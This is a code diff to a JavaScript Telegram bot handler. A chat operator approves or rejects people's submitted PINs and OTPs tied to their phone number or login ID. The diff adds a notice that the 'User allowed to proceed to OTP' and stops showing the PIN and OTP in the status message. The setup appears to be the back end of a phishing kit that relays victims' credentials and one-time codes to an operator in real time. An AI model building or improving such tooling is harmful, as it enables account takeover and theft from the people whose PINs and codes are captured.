@@ -266,8 +266,18 @@ async function handleCallback(cq) {
     } else {
       console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
     }
+    
+    // Send a separate reply message to notify admin of the decision
+    if (rec) {
+      tgApi('sendMessage', {
+        chat_id: CHAT_ID,
+        text: `🔐 PIN ${decision === 'approved' ? 'verified' : 'rejected'} for ${rec.phone || rec.loginId || id}. User ${decision === 'approved' ? 'allowed to proceed to OTP' : 'must try again'}.`
+      });
+    }
+    
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
     if (rec && rec.messageId) {
+      // Don't show the PIN in the edited message, just the status
       tgApi('editMessageText', {
         chat_id: rec.chatId,
         message_id: rec.messageId,
@@ -275,8 +285,6 @@ async function handleCallback(cq) {
           text:
             `<b>🔐 ${kind} Verification</b>\n\n` +
             `User: ${esc(rec.phone || 'N/A')}\n` +
-            (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
-            (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
             `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
             `Status: <b>${stamp}</b>`,
       });
